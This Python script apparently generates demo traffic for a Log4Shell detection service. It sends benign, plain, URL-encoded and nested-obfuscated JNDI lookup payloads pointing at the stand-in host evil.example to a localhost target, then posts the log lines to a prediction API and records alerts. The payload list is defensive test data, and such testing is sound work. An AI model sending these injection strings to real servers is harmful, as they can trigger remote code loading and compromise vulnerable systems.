#!/usr/bin/env python3
"""Generate benign, malicious, encoded, nested, and hard-negative demo traffic."""

from __future__ import annotations

import argparse
import json
import time
from datetime import datetime, timezone
from pathlib import Path

import requests


PAYLOADS = [
    ("benign", "GET /home HTTP/1.1", "/home", "Mozilla/5.0", "1.0"),
    ("plain", "GET /?q=${jndi:ldap://evil.example/a} HTTP/1.1", "/?q=${jndi:ldap://evil.example/a}", "${jndi:ldap://evil.example/a}", "1.0"),
    ("encoded", "GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D HTTP/1.1", "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "Mozilla/5.0", "1.0"),
    ("nested", "GET /?q=${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a} HTTP/1.1", "/", "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil.example/a}", "1.0"),
    ("hard_negative", "Security scanner report mentions \\${jndi:ldap://example.com/a} as text", "/docs/log4shell", "Mozilla/5.0", "stable"),
]


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:8080")
    parser.add_argument("--api", default="http://localhost:8000")
    parser.add_argument("--log-file", default="demo/logs/access.log")
    parser.add_argument("--alerts", default="results/live_alerts.jsonl")
    parser.add_argument("--iterations", type=int, default=1)
    parser.add_argument("--sleep", type=float, default=1.0)
    parser.add_argument("--loop", action="store_true")
    args = parser.parse_args()
    log_file = Path(args.log_file)
    alerts = Path(args.alerts)
    log_file.parent.mkdir(parents=True, exist_ok=True)
    alerts.parent.mkdir(parents=True, exist_ok=True)
    iteration = 0
    while args.loop or iteration < args.iterations:
        iteration += 1
        for _, log_line, path, ua, version in PAYLOADS:
            try:
                requests.get(args.target.rstrip("/") + path, headers={"User-Agent": ua, "X-Api-Version": version}, timeout=3)
            except Exception:
                pass
            with log_file.open("a", encoding="utf-8") as handle:
                handle.write(log_line + "\n")
            try:
                response = requests.post(args.api.rstrip("/") + "/predict", json={"log": log_line}, timeout=5)
                result = response.json()
                if result.get("risk_level") in {"suspicious", "critical"}:
                    alert = {
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "label": result["label"],
                        "risk_score": result["score"],
                        "risk_level": result["risk_level"],
                        "raw_log": log_line,
                        "normalized_log": result["normalized_log"],
                        "detected_patterns": result["detected_patterns"],
                        "recommendation": "Inspect outbound LDAP/RMI/DNS traffic and verify Log4j patch status.",
                    }
                    with alerts.open("a", encoding="utf-8") as handle:
                        handle.write(json.dumps(alert) + "\n")
            except Exception:
                pass
            print(log_line, flush=True)
            time.sleep(args.sleep)


if __name__ == "__main__":
    main()
